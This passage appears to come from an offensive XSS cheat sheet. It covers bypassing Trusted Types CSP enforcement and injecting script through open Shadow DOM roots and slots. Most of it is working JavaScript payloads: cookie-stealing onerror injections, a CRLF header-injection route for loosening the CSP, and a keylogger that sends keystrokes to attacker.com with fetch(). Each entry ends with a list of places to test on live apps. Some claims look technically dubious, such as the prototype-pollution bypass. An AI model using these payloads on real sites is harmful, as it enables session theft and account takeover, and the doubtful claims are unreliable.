...
**Type:** DOM / reflected / stored
**Filter bypassed:** `require-trusted-types-for 'script'` CSP directive — the browser's built-in XSS defense for dangerous sinks
**Bypass logic:** Trusted Types (TT) enforces that values flowing into dangerous sinks (`innerHTML`, `eval`, `document.write`, etc.) must be wrapped by a registered policy. Four bypass paths: (1) If the app creates a permissive policy that passes through unmodified input, inject via that policy. (2) If `default` policy is allowed, any string automatically wraps — equivalent to no TT. (3) Prototype pollution can overwrite the function that TT calls to create a `TrustedHTML` instance, making attacker strings pass as trusted. (4) Sinks not covered by TT (e.g., `location.href`, `script.src`, custom element callbacks) remain exploitable even when TT is active.
**Attack chain:** Identify TT policy source → inject into permissive/default policy → flow attacker string through trusted sink → XSS → ATO

**Payload:**
```javascript
// Path 1: Permissive policy injection
// App has policy: trustedTypes.createPolicy('escape', { createHTML: s => s })
// → Policy is a passthrough; just call it directly from XSS context:
const policy = trustedTypes.getPolicy('escape');
const evil = policy.createHTML('<img src=x onerror=alert(document.cookie)>');
document.body.innerHTML = evil;   // Trusted Types satisfied; XSS fires

// Path 2: Default policy abuse (app registers trustedTypes.createPolicy('default', ...))
// If default policy exists and accepts arbitrary input:
document.body.innerHTML = '<img src=x onerror=alert(1)>';
// → TT intercepts → routes through default policy → if permissive, passes as TrustedHTML

// Path 3: Prototype pollution → bypass TT enforcement
// Pollute the internal TrustedHTML constructor check:
Object.prototype.toString = function() { return '[object TrustedHTML]'; };
// In Chromium's TT implementation, some checks use toString-based type detection
// Polluting it makes arbitrary strings appear to be TrustedHTML instances

// Path 4: Non-TT sinks (always exploitable even with TT active)
location.href = 'javascript:alert(1)';    // location is NOT a TT sink
element.src = 'javascript:alert(1)';     // src is not a TT-protected sink in all contexts
new Function('alert(document.cookie)')();  // Function constructor — TT covers only innerHTML etc.

// Path 5: CSP + TT combined policy injection via header injection
// If attacker can inject a CRLF into a response that sets CSP:
// Inject: Content-Security-Policy: trusted-types *\r\n
// → Wildcard policy name allows ANY policy → attacker creates permissive policy

// Detection: Check if trustedTypes is defined and what policies exist
console.log([...trustedTypes.getPolicyNames()]);  // lists all registered policy names
```

**Where to test:**
```
- Apps with Content-Security-Policy: require-trusted-types-for 'script'
- React/Angular apps with DOMPurify + TT integration
- Check trustedTypes.getPolicyNames() in browser console
- Look for createPolicy('default', ...) — default policy = permissive gate
- Test prototype pollution vectors first (they can silently disable TT)
```

**Source:** https://w3c.github.io/trusted-types/dist/spec/ ; https://github.com/nicowillis/trusted-types-playground

---

## Shadow DOM Open-Mode XSS

**Type:** DOM / stored
**Filter bypassed:** Sanitizers and WAF rules that check `document.body.innerHTML` but do not pierce into shadow roots; Content Security Policy enforced only at document level
**Bypass logic:** Shadow DOM encapsulates subtrees from main document queries. When a shadow root is attached in `open` mode, external JavaScript can access it via `element.shadowRoot`. Sanitizers that scan `document.body.innerHTML` before insertion do not see shadow DOM content — a stored payload injected into a slotted element or directly into an open shadow root bypasses sanitization. Additionally, events fired inside the shadow DOM bubble out via composed event paths, enabling cross-boundary keylogging and form capture from within the shadow tree.
**Attack chain:** Inject into slotted `<slot>` content or open shadow root → sanitizer sees flat DOM only → XSS in shadow tree executes in page context → cookie theft / keylogging → ATO

**Payload:**
```javascript
// Attacker creates an open shadow root and injects XSS:
var host = document.createElement('div');
document.body.appendChild(host);
var shadow = host.attachShadow({mode: 'open'});
shadow.innerHTML = '<img src=x onerror=alert(document.cookie)>';
// → Sanitizer that checked document.body.innerHTML BEFORE this runs sees nothing
// → XSS fires in document context (same origin), full cookie/DOM access

// Access another element's open shadow root (for injection):
var target = document.querySelector('my-widget');
if (target.shadowRoot) {                    // only possible in 'open' mode
  target.shadowRoot.innerHTML += '<img src=x onerror=alert(1)>';
}

// Slot injection — content projected into shadow DOM via <slot>:
// Shadow DOM definition (inside web component):
//   shadowRoot.innerHTML = '<slot></slot>';
// Attacker controls slotted content (e.g., user-supplied label):
document.querySelector('my-label').innerHTML = '<img src=x onerror=alert(1)>';
// → Slotted content renders inside shadow DOM; sanitizer only sees outer innerHTML

// Cross-shadow-root event interception (keylogging from shadow DOM forms):
document.addEventListener('keypress', function(e) {
  // composedPath() reveals the full path including shadow DOM elements
  var path = e.composedPath();
  if (path.some(el => el.shadowRoot)) {
    fetch('https://attacker.com/k?key=' + e.key);
  }
}, true);  // capture phase — fires before shadow DOM handlers

// Detection: check if custom elements expose open shadow roots
document.querySelectorAll('*').forEach(el => {
  if (el.shadowRoot) console.log('Open shadow root:', el.tagName);
});
```

**Where to test:**
```
- Web components / custom elements (my-widget, app-header, etc.)
- Lit, Stencil, Polymer, FAST framework components
- Check each custom element: target.shadowRoot !== null
- Slots fed by user-controlled content (display names, labels in components)
- Apps that sanitize once before insertion but re-render via JS
```

**Source:** https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_shadow_DOM ; https://portswigger.net/research/shadow-dom-xss
